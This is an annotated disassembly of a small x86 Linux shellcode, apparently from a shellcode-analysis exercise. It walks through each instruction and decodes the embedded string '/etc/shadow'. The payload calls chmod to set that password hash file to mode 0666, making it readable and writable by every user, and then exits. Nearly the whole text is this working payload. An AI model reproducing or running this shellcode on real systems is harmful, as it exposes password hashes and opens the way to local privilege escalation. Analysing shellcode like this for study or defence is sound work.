0x0804a040 <shellcode+0>:	cdq                                ; convert DW to QW, zero out data register    
0x0804a041 <shellcode+1>:	push   0xf                         ; push 15 to the stack
0x0804a043 <shellcode+3>:	pop    eax                         ; store 15 in accumulator register
0x0804a044 <shellcode+4>:	push   edx                         ; push NULL terminator to the stack
0x0804a045 <shellcode+5>:	call   0x804a056 <shellcode+22>    ; unconditional jump to 0x804a056 <shellcode+22> ----+
;                                                                                                                   |  
; the following block translate to ("/etc/shadow") ---------------------+                                           |
;                                                                       |                                           |
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;           |                                           |
0x0804a04a <shellcode+10>:	das                             ;           |                                           |
0x0804a04b <shellcode+11>:	gs je  0x804a0b1                ;           |                                           |
0x0804a04e <shellcode+14>:	das                             ;           |                                           |
0x0804a04f <shellcode+15>:	jae    0x804a0b9                ;           |                                           |
0x0804a051 <shellcode+17>:	popa                            ;           |                                           |
0x0804a052 <shellcode+18>:	outs   dx,DWORD PTR fs:[esi]    ;           |                                           | 
0x0804a054 <shellcode+20>:	ja     0x804a056 <shellcode+22> ;           |                                           | 
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;           |                                           |
;                                                                       |                                           |
;+------------------------------------------------------------------------------------------------------------------+
;|                                                                      |
;|                                                                      |
;+------------------------->                                            |
0x0804a056 <shellcode+22>:	pop    ebx                         ; <------+    
0x0804a057 <shellcode+23>:	push   0x1b6                       ; push octal 666 to the stack
0x0804a05c <shellcode+28>:	pop    ecx                         ; store octal 666 in counter register
0x0804a05d <shellcode+29>:	int    0x80                        ; chmod(EBX, ECX) where EBX=/etc/shadow and ECX=666
0x804a05f <shellcode+31>:	push   0x1                         ; push 1 to the stack
0x804a061 <shellcode+33>:	pop    eax                         ; store 1 in stack
0x804a062 <shellcode+34>:	int    0x80                        ; exit gracefully

